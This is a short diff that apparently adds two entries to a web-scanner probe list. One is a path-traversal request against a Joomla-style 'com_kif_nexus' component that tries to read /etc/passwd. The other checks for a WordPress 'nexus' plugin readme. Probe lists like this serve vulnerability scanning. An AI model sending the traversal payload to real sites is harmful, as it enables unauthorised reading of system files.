@@ -1,0 +1,2 @@
+/index.php?option=com_kif_nexus&controller=../../../../../../../../../etc/passwd
+/wp-content/plugins/nexus/readme.txt
